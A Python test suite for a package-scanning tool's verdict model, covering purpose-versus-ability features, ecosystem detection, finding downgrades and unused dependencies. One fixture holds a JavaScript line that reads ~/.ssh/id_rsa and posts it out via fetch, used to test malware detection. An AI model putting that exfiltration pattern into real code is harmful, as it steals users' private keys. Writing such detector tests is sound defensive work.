"""What the package verdict reads about a package (`core/verdict.py`)."""

from __future__ import annotations

import gzip
import json
from unittest import mock

from cordon_scanner.core.models import (
    Category,
    Confidence,
    Evidence,
    EvidenceKind,
    Explanation,
    Finding,
    Location,
    RedactionMode,
    RiskScore,
    Severity,
)
from cordon_scanner.core.verdict import Verdict, VerdictFeatures, VerdictModel


class FeatureKit:
    @staticmethod
    def features(manifest: dict[str, object], code: bytes) -> dict[str, float]:
        return VerdictFeatures.package(
            [("p!package/package.json", 100), ("p!package/index.js", len(code))],
            {"p!package/package.json": json.dumps(manifest).encode()},
            [("p!package/index.js", code)],
        )


class TestPurposeAndAbility:
    def test_a_small_utility_that_reads_credentials_is_a_mismatch(self) -> None:
        found = FeatureKit.features(
            {"name": "color-format-lite", "description": "Format colours"},
            b'const k = require("fs").readFileSync(home + "/.ssh/id_rsa"); fetch(u, {body: k});',
        )
        assert found["purpose_ui"] == 1.0
        assert found["can_secret_paths"] == 1.0
        assert found["plain_with_sensitive"] == 1.0

    def test_an_http_client_that_makes_requests_is_not(self) -> None:
        found = FeatureKit.features(
            {"name": "tiny-api-client", "description": "A small REST client"},
            b"module.exports = (u) => fetch(u).then((r) => r.json());",
        )
        assert found["purpose_http"] == 1.0
        assert found["can_network"] == 1.0
        assert found["plain_with_sensitive"] == 0.0
        assert found["plain_with_process_net"] == 0.0

    def test_dependencies_code_is_not_the_packages_own(self) -> None:
        found = VerdictFeatures.package(
            [("p!package/package.json", 10)],
            {"p!package/package.json": json.dumps({"name": "x"}).encode()},
            [("p!package/node_modules/dep/index.js", b"require('child_process').exec(c)")],
        )
        assert found["can_process"] == 0.0

    def test_without_sources_every_ability_is_absent(self) -> None:
        found = VerdictFeatures.package([], {})
        assert all(value == 0.0 for key, value in found.items() if key.startswith("can_"))


class VerdictKit:
    """A one-split model: a package scores 0.9 when `r:SUSPECT.X.001` reaches HIGH, else 0.1."""

    @staticmethod
    def model(floor: tuple[str, ...] = ()) -> dict[str, object]:
        logit = 2.1972245773  # log(0.9 / 0.1)
        return {
            "format": VerdictModel.FORMAT,
            "features": ["r:SUSPECT.X.001"],
            "baseline": 0.0,
            "trees": [
                [
                    {
                        "leaf": False,
                        "feature": 0,
                        "threshold": 2.5,
                        "left": 1,
                        "right": 2,
                        "missing_left": True,
                    },
                    {"leaf": True, "value": -logit},
                    {"leaf": True, "value": logit},
                ]
            ],
            "areas": {"npm": 0.5, "package": 0.95},
            "floor": list(floor),
        }

    @staticmethod
    def finding(rule: str, severity: Severity, category: Category = Category.SUSPICIOUS) -> Finding:
        return Finding(
            rule_id=rule,
            category=category,
            severity=severity,
            confidence=Confidence.HIGH,
            message="m.",
            location=Location(path="package/index.js"),
            evidence=Evidence(
                kind=EvidenceKind.SNIPPET,
                match_hash=Evidence.hash_bytes(b"x"),
                redaction=RedactionMode.MASKED,
            ),
            remediation="",
            explanation=Explanation(summary="", matched_rule=rule),
            risk=RiskScore(value=50, base=50, confidence_multiplier=1.0),
            detector="t",
        )

    @staticmethod
    def decide(findings: list[Finding], model: dict[str, object], layout: str = "package/"):
        with mock.patch.object(VerdictModel, "load", return_value=model):
            return Verdict.decide(
                findings,
                [(f"{layout}package.json", 10), (f"{layout}index.js", 10)],
                {f"{layout}package.json": b'{"name": "x"}'},
            )


class TestTheShippedVerdict:
    def test_cosmetic_facts_are_never_scored(self) -> None:
        found = VerdictFeatures.evidence(
            [("SUSPECT.X.001", 3, 2, "suspicious", "package/index.js")],
            {"has_readme": 1.0, "desc_len": 40.0, "hook": 1.0},
        )
        assert "pkg:has_readme" not in found
        assert "pkg:desc_len" not in found
        assert found["pkg:hook"] == 1.0

    def test_evidence_only_rises_with_another_finding(self) -> None:
        one = VerdictFeatures.evidence([("SUSPECT.X.001", 2, 1, "suspicious", "a.js")], {})
        two = VerdictFeatures.evidence(
            [
                ("SUSPECT.X.001", 2, 1, "suspicious", "a.js"),
                ("SUSPECT.X.001", 3, 2, "suspicious", "SKILL.md"),
            ],
            {},
        )
        assert all(two[k] >= v for k, v in one.items())
        assert two["w:skilltext"] == 3.0

    def test_intel_secrets_and_its_own_finding_are_not_evidence(self) -> None:
        found = VerdictFeatures.evidence(
            [
                ("MALWARE.PACKAGE.KNOWN.001", 4, 3, "malicious", "."),
                ("SUSPECT.EXTENSION.REMOVED.001", 3, 2, "suspicious", ".vscode/extensions.json"),
                ("SECRET.AWS.001", 3, 2, "suspicious", "a.env"),
                (VerdictFeatures.OWN_RULE, 3, 1, "suspicious", "."),
            ],
            {},
        )
        assert found == {}

    def test_the_archive_layout_names_the_ecosystem(self) -> None:
        def area(*names: str) -> str:
            return Verdict.area(list(names), {}, {}, {})

        assert area("package/package.json", "package/index.js") == "npm"
        assert area("x-1.0/PKG-INFO", "x-1.0/x/__init__.py") == "pypi"
        assert area("x-1.0.dist-info/METADATA") == "pypi"
        assert area("extension.vsixmanifest", "extension/package.json") == "openvsx"
        assert area("src/main.go", "go.mod") == Verdict.FALLBACK

    def test_a_registry_package_that_ships_a_skill_is_judged_by_its_registry(self) -> None:
        names = ["package/package.json", "package/skills/x/SKILL.md"]
        assert Verdict.area(names, {}, {"skill": 1.0}, {}) == "npm"
        assert Verdict.area(["x/SKILL.md", "x/run.sh"], {}, {"skill": 1.0}, {}) == "skill"

    def test_over_its_line_a_package_keeps_every_finding(self) -> None:
        findings = [VerdictKit.finding("SUSPECT.X.001", Severity.HIGH)]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model())
        assert summary["area"] == "npm"
        assert summary["score"] >= summary["block"]
        assert graded == findings

    def test_under_its_line_a_malicious_finding_is_held_as_a_warning(self) -> None:
        findings = [
            VerdictKit.finding("MALWARE.Y.001", Severity.CRITICAL, Category.MALICIOUS),
            VerdictKit.finding("SUSPECT.Z.001", Severity.MEDIUM),
        ]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model())
        assert summary["score"] < summary["block"]
        assert graded[0].severity == Severity.MEDIUM
        assert graded[0].category is Category.SUSPICIOUS
        assert graded[1] == findings[1]

    def test_the_floor_and_intel_are_never_held(self) -> None:
        findings = [
            VerdictKit.finding("MALWARE.Y.001", Severity.CRITICAL, Category.MALICIOUS),
            VerdictKit.finding("MALWARE.PACKAGE.KNOWN.001", Severity.CRITICAL, Category.MALICIOUS),
        ]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model(floor=("MALWARE.Y.001",)))
        assert summary["score"] < summary["block"]
        assert graded == findings

    def test_an_unrecognised_package_answers_to_the_strictest_line(self) -> None:
        findings = [VerdictKit.finding("SUSPECT.X.001", Severity.HIGH)]
        graded, summary = VerdictKit.decide(findings, VerdictKit.model(), layout="src/")
        assert summary["area"] == Verdict.FALLBACK
        assert summary["block"] == 0.95
        assert graded[0].severity == Severity.MEDIUM

    def test_a_model_of_another_format_is_not_used(self, tmp_path) -> None:
        old = tmp_path / "verdict.json.gz"
        with gzip.open(old, "wt", encoding="utf-8") as handle:
            json.dump({"vocab": [], "trees": []}, handle)
        assert VerdictModel.load(old) is None

    def test_in_an_add_only_area_nothing_is_lifted(self) -> None:
        findings = [VerdictKit.finding("MALWARE.Y.001", Severity.CRITICAL, Category.MALICIOUS)]
        model = {**VerdictKit.model(), "add_only": ["npm"]}
        graded, summary = VerdictKit.decide(findings, model)
        assert summary["score"] < summary["block"]
        assert graded == findings


class TestDependenciesTheCodeNeverUses:
    def test_a_new_dependency_nothing_imports_is_counted(self) -> None:
        found = FeatureKit.features(
            {
                "name": "http-thing",
                "dependencies": {"follow-redirects": "^1", "zq-crypto-kit": "1"},
            },
            b"const r = require('follow-redirects/http');",
        )
        assert found["deps_unused"] == 1.0
        assert found["deps_unused_unknown"] == 1.0

    def test_a_dependency_named_by_a_script_or_an_import_is_used(self) -> None:
        found = FeatureKit.features(
            {
                "name": "x",
                "scripts": {"build": "rimraf dist && tsc"},
                "dependencies": {"rimraf": "5", "lodash": "4", "@types/node": "20"},
            },
            b"import get from 'lodash/get';",
        )
        assert found["deps_unused"] == 0.0
